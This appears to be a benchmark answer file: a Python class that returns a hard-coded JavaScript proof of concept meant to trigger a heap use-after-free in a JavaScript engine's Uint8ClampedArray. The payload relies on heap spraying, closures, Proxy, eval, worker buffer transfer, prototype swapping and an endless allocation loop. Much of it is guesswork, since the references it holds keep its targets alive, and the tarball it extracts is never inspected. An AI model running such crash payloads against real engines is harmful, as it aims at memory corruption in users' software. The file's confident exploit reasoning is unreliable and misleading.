import os
import tarfile
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Look for the relevant source files
            js_dir = os.path.join(tmpdir, 'js')
            web_dir = os.path.join(tmpdir, 'web')
            
            # Based on the vulnerability description, we need to trigger
            # a heap use-after-free related to Uint8ClampedArray
            # The bug is that it's implemented as separate class instead of
            # inheriting from TypedArray
            
            # We'll create JavaScript that:
            # 1. Creates Uint8ClampedArray objects
            # 2. Manipulates them to trigger the UAF
            # 3. Uses the freed memory
            
            # Typical UAF pattern in JavaScript engines:
            # - Create object
            # - Keep reference in different scope
            # - Free the object
            # - Use the dangling reference
            
            poc_js = """// Heap Use-After-Free PoC for Uint8ClampedArray bug

// Allocate multiple arrays to setup heap
let arrays = [];
for (let i = 0; i < 1000; i++) {
    arrays.push(new Uint8ClampedArray(1024));
}

// Create target array that will be freed
let target = new Uint8ClampedArray(1024);
let weakRef;

// Function that captures reference in closure
function createClosure(arr) {
    return function() {
        // This should trigger UAF when arr is freed
        arr[0] = 42;
        return arr[0];
    };
}

// Create closure that keeps reference
let closure = createClosure(target);

// Remove strong references to target
arrays = null;
target = null;

// Force garbage collection multiple times
// (This might need adjustment based on engine)
for (let i = 0; i < 10; i++) {
    let temp = [];
    for (let j = 0; j < 10000; j++) {
        temp.push(new Uint8ClampedArray(1024));
    }
}

// Try to use the closure - should trigger UAF
try {
    closure();
} catch(e) {
    // Expected to crash before reaching here
}

// Additional manipulation to increase chance of crash
let another = new Uint8ClampedArray(1024);
let buffer = another.buffer;

// Transfer ArrayBuffer to potentially cause issues
try {
    let workerCode = `self.onmessage = function(e) { 
        postMessage('done'); 
    }`;
    let blob = new Blob([workerCode]);
    let worker = new Worker(URL.createObjectURL(blob));
    worker.postMessage(buffer, [buffer]);
} catch(e) {
    // Some engines might not support workers
}

// More aggressive approach - create and free rapidly
for (let i = 0; i < 100; i++) {
    let tempArr = new Uint8ClampedArray(1024);
    let alias = tempArr;
    
    // Create multiple references
    let ref1 = alias.subarray(0, 512);
    let ref2 = new Uint8ClampedArray(alias.buffer);
    
    // Nullify references in different order
    alias = null;
    tempArr = null;
    
    // Try to use subarray reference
    try {
        ref1[0] = i;
        ref2[512] = 255 - i;
    } catch(e) {
        // Ignore errors
    }
    
    // Force allocation between operations
    new ArrayBuffer(1024);
}

// Final attempt with prototype manipulation
// This might trigger the TypedArray inheritance issue
Uint8ClampedArray.prototype.customMethod = function() {
    return this.length;
};

let lastArray = new Uint8ClampedArray(256);
let proxy = new Proxy(lastArray, {
    get(target, prop) {
        // Accessing properties might trigger UAF
        return target[prop];
    }
});

// Access through proxy
try {
    proxy[0] = 255;
    proxy.customMethod();
} catch(e) {
    // Expected crash
}

// Create dangling reference through eval
let evalCode = `
    (function() {
        let internal = new Uint8ClampedArray(128);
        window.__dangling = internal;
        return function() {
            // This closure keeps reference
            internal[0] = 123;
        };
    })()
`;

let dangler = eval(evalCode);
dangler = null;

// Clear global reference
window.__dangling = null;

// Final memory pressure
let pressure = [];
for (let i = 0; i < 1000; i++) {
    pressure.push(new Uint8ClampedArray(2048));
    pressure.push(new ArrayBuffer(4096));
}

// Trigger one last operation that should crash
try {
    let final = new Uint8ClampedArray(64);
    let finalView = new Uint8Array(final.buffer);
    finalView.set([1,2,3,4,5]);
    
    // Cross-type manipulation
    Object.setPrototypeOf(final, Uint8Array.prototype);
    
    // This should fail if inheritance is broken
    final.byteOffset;
} catch(e) {
    // Crash expected
}

// Keep running to ensure crash
while(true) {
    new Uint8ClampedArray(1);
}
"""
            
            # Convert to bytes
            return poc_js.encode('utf-8')